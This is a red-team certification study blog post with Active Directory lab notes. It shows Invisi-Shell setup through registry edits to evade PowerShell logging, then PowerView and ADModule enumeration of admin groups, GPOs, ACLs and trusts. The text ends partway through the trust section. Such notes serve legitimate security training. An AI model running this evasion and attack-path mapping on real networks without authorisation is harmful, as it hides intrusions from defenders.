<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Certified Red Team Professional Notes" /><meta property="og:locale" content="en" /><meta name="description" content="Certified Red Team Professional Notes" /><meta property="og:description" content="Certified Red Team Professional Notes" /><link rel="canonical" href="https://ahmedel-rayes.github.io/posts/CRTP/" /><meta property="og:url" content="https://ahmedel-rayes.github.io/posts/CRTP/" /><meta property="og:site_name" content="Anubis-Sec" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-03-07T15:23:00-06:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Certified Red Team Professional Notes" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-03-30T19:40:21-05:00","datePublished":"2023-03-07T15:23:00-06:00","description":"Certified Red Team Professional Notes","headline":"Certified Red Team Professional Notes","mainEntityOfPage":{"@type":"WebPage","@id":"https://ahmedel-rayes.github.io/posts/CRTP/"},"url":"https://ahmedel-rayes.github.io/posts/CRTP/"}</script><title>Certified Red Team Professional Notes | Anubis-Sec</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Anubis-Sec"><meta name="application-name" content="Anubis-Sec"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/anubis.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Anubis-Sec</a></div><div class="site-subtitle font-italic">“Ask, and it shall be given you; seek, and ye shall find; knock, and it shall be opened unto you”</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/AhmedEl-Rayes" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['aelrayes00','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/ahmedelrayes00/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Certified Red Team Professional Notes</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Certified Red Team Professional Notes</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1678224180" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Mar 7, 2023 </em> </span> <span> Updated <em class="" data-ts="1680223221" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Mar 30, 2023 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/AhmedEl-Rayes">Ahmed El-Rayes</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="6816 words"> <em>37 min</em> read</span></div></div></div><div class="post-content"><h1 id="certified-red-team-professional-notes">Certified Red Team Professional Notes</h1><h2 id="week-1"><span class="mr-2">Week 1</span><a href="#week-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>• Enumerate useful information like users, groups, group memberships, computers, user properties, trusts, ACLs etc. to map attack paths!</p><p>• Learn and practice different local privilege escalation techniques on a Windows machine.</p><p>• Hunt for local admin privileges on machines in the target domain using multiple methods.</p><p>• Abuse enterprise applications to execute complex attack paths that involve bypassing antivirus and pivoting to different machines.</p><h3 id="learning-objective-1"><span class="mr-2">Learning Objective 1</span><a href="#learning-objective-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Enumerating Users, Computers, Domain Admins, and Enterprise Admins.</p><h4 id="using-powerview"><span class="mr-2">Using PowerView</span><a href="#using-powerview" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Start a PowerShell session using Invisi-Shell to avoid enhanced logging. (\AD\Tools\InvisiShell\RunWithRegistryNonAdmin.bat)</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="n">C:\Users\studentx</span><span class="err">&gt;</span><span class="nx">cd</span><span class="w"> </span><span class="nx">\AD\Tools</span><span class="w">
</span><span class="n">C:\AD\Tools</span><span class="err">&gt;</span><span class="nx">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w">
</span><span class="n">C:\AD\Tools</span><span class="err">&gt;</span><span class="nx">set</span><span class="w"> </span><span class="nx">COR_ENABLE_PROFILING</span><span class="o">=</span><span class="mi">1</span><span class="w">
</span><span class="n">C:\AD\Tools</span><span class="err">&gt;</span><span class="nx">set</span><span class="w"> </span><span class="nx">COR_PROFILER</span><span class="o">=</span><span class="p">{</span><span class="n">cf0d821e-299b-5307-a3d8-b283c03916db</span><span class="p">}</span><span class="w">
</span><span class="n">C:\AD\Tools</span><span class="err">&gt;</span><span class="nx">REG</span><span class="w"> </span><span class="nx">ADD</span><span class="w"> </span><span class="s2">"HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}"</span><span class="w"> </span><span class="nx">/f</span><span class="w">
</span><span class="n">The</span><span class="w"> </span><span class="nx">operation</span><span class="w"> </span><span class="nx">completed</span><span class="w"> </span><span class="nx">successfully.</span><span class="w">
</span><span class="n">C:\AD\Tools</span><span class="err">&gt;</span><span class="nx">REG</span><span class="w"> </span><span class="nx">ADD</span><span class="w"> </span><span class="s2">"HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-
b283c03916db}\InprocServer32"</span><span class="w"> </span><span class="nx">/f</span><span class="w">
</span><span class="n">The</span><span class="w"> </span><span class="nx">operation</span><span class="w"> </span><span class="nx">completed</span><span class="w"> </span><span class="nx">successfully.</span><span class="w">
</span><span class="n">C:\AD\Tools</span><span class="err">&gt;</span><span class="nx">REG</span><span class="w"> </span><span class="nx">ADD</span><span class="w"> </span><span class="s2">"HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32"</span><span class="w"> </span><span class="nx">/ve</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/d</span><span class="w">
</span><span class="s2">"C:\AD\Tools\InviShell\InShellProf.dll"</span><span class="w"> </span><span class="n">/f</span><span class="w">
</span><span class="nx">The</span><span class="w"> </span><span class="nx">operation</span><span class="w"> </span><span class="nx">completed</span><span class="w"> </span><span class="nx">successfully.</span><span class="w">
</span><span class="n">C:\AD\Tools</span><span class="err">&gt;</span><span class="nx">powershell</span><span class="w">
</span><span class="n">Windows</span><span class="w"> </span><span class="nx">PowerShell</span><span class="w">
</span><span class="n">Copyright</span><span class="w"> </span><span class="p">(</span><span class="n">C</span><span class="p">)</span><span class="w"> </span><span class="n">Microsoft</span><span class="w"> </span><span class="nx">Corporation.</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nx">rights</span><span class="w"> </span><span class="nx">reserved.</span><span class="w">
</span></pre></table></code></div></div><p>Load Powerview in the PowerShell Session</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="w"> </span><span class="n">C:\Ad\Tools\PowerView.ps1</span><span class="w">
</span></pre></table></code></div></div><p>To see users in the domain,</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-DomainUser</span><span class="w">
</span></pre></table></code></div></div><p>and to get only a specific property of all users, use the select-object cmdlet as such.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-DomainUser</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">samaccountname</span><span class="w">
</span></pre></table></code></div></div><p>To see domain computer objects</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-DomainComputer</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">dnshostname</span><span class="w">
</span></pre></table></code></div></div><p>to see details of the DA group, can get SIDs, Membernames</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-DomainGroup</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"Domain Admins"</span><span class="w">
</span></pre></table></code></div></div><p>To enumerate members of the EA group</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-DomainGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"Enterprise Admins"</span><span class="w">
</span></pre></table></code></div></div><p>If you are not in the root domain, this command will not work. You need to query the root domain as EA group is only present in the root of the forest.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-DomainGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"Enterprise Admins"</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="nx">moneycorp.local</span><span class="w">
</span></pre></table></code></div></div><h4 id="using-admodule"><span class="mr-2">Using ADModule</span><a href="#using-admodule" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>In a different invisishell session, import the ADModule with</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">Import-Module</span><span class="w"> </span><span class="nx">C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll</span><span class="w">

</span><span class="n">and</span><span class="w"> 

</span><span class="n">Import-Module</span><span class="w"> </span><span class="nx">C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1</span><span class="w">
</span></pre></table></code></div></div><p>Then you can begin user enumeration with</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-ADUser</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w">
</span></pre></table></code></div></div><p>Use the -Properties paramter to filter by the properties you want to see, for example</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-ADUser</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">Samaccountname</span><span class="p">,</span><span class="nx">Description</span><span class="w">
</span></pre></table></code></div></div><p>To list computers</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-ADComputer</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w">
</span></pre></table></code></div></div><p>Enumerate Domain Administrators with</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-ADGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'Domain Admins'</span><span class="w">
</span></pre></table></code></div></div><p>Enumerate Enterprise Admins with</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-ADGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'Enterprise Admins'</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="nx">moneycorp.local</span><span class="w">
</span></pre></table></code></div></div><h3 id="learning-objective-2"><span class="mr-2">Learning Objective 2</span><a href="#learning-objective-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Enumerate OUs, list all computers in the StudentMachines OU, List the GPOs, Enumerate GPO applied on the StudentMachines OU.</p><h4 id="powerview"><span class="mr-2">PowerView</span><a href="#powerview" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>To list all OUs</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-DomainOU</span><span class="w">
</span></pre></table></code></div></div><p>To only see the names of OUs</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-DomainOU</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">name</span><span class="w">
</span></pre></table></code></div></div><p>Listing all computers in the StudentMachines OU more complicated</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">(</span><span class="n">Get-DomainOU</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">StudentMachines</span><span class="p">)</span><span class="o">.</span><span class="nf">distinguishedname</span><span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="o">%</span><span class="p">{</span><span class="n">Get-DomainComputer</span><span class="w"> </span><span class="nt">-SearchBase</span><span class="w"> </span><span class="bp">$_</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">name</span><span class="w">
</span></pre></table></code></div></div><p>To get GPOs</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-DomainGPO</span><span class="w">
</span></pre></table></code></div></div><p>To Enumerate GPO applied on the StudentMachines OU, you need to copy part of the gplink attribute from the output of the command below:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">(</span><span class="n">Get-DomainOU</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">StudentMachines</span><span class="p">)</span><span class="o">.</span><span class="nf">gplink</span><span class="w">
</span></pre></table></code></div></div><p>The part you need to copy will look like</p><p><code class="language-plaintext highlighter-rouge">{7478F170-6A0C-490C-B355- 9E4618BC785D}</code></p><p>Then, to see GPO applied to StudentMachines, use</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">Get-DomainGPO</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'{7478F170-6A0C-490C-B355-
9E4618BC785D}'</span><span class="w">
</span></pre></table></code></div></div><p>With powershell magic, you can do this all in one command:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-DomainGPO</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="p">(</span><span class="n">Get-DomainOU</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">StudentMachines</span><span class="p">)</span><span class="o">.</span><span class="nf">gplink</span><span class="o">.</span><span class="nf">substring</span><span class="p">(</span><span class="nx">11</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">Get-DomainOU</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">StudentMachines</span><span class="p">)</span><span class="o">.</span><span class="nf">gplink</span><span class="o">.</span><span class="nf">length-72</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><h3 id="learning-objective-3"><span class="mr-2">Learning Objective 3</span><a href="#learning-objective-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Enumerate ACL for DA group, and view modify rights and permissions for students.</p><h4 id="using-powerview-1"><span class="mr-2">Using PowerView</span><a href="#using-powerview-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>To enumerate ACLs in the Domain Admins Group</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-DomainObjectAcl</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"Domain Admins"</span><span class="w"> </span><span class="nt">-ResolveGUIDS</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><p>To check for modify rights/permissions, use <code class="language-plaintext highlighter-rouge">Find-InterestingDomainACL</code> from powerview as such</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Find-InterestingDomainAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReferenceName</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"&lt;student name&gt;"</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>To see permissions for the RDP group</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">Find-InterestingDomainAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w">
</span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReferenceName</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"RDPUsers"</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><h3 id="learning-objective-4"><span class="mr-2">Learning Objective 4</span><a href="#learning-objective-4" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="using-powerview-2"><span class="mr-2">Using Powerview</span><a href="#using-powerview-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>To enumerate all domains in the current forest</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-ForestDomain</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><p>To map all the trusts of the domain</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-DomainTrust</span><span class="w">
</span></pre></table></code></div></div><p>To list only the external trusts in the moneycorp.local forest</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">Get-ForestDomain</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="p">{</span><span class="n">Get-DomainTrust</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Name</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w">
</span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">TrustAttributes</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"FILTER_SIDS"</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>To identiy external trusts of the dollarcorp domain, we can use the below command.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-DomainTrust</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">TrustAttributes</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"FILTER_SIDS"</span><span class="p">}</span><span class="w">
